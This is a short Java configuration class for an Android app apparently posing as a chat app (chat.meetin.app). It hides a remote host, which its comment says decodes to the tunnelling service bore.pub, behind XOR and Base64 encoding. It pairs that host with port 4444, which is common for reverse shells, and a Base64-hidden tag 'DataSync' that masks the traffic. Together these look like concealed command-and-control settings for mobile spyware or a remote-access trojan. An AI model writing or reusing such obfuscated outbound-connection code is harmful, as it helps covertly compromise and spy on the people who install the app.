package chat.meetin.app;

import android.util.Base64;

public class Config {
    // XOR 0x5A + Base64: ODUoP3QqLzg= → bore.pub
    public static final String HOST = Decoder.decode("ODUoP3QqLzg=");
    public static final int PORT = 4444;
    public static final String TAG = new String(Base64.decode("RGF0YVN5bmM=", Base64.DEFAULT));
}
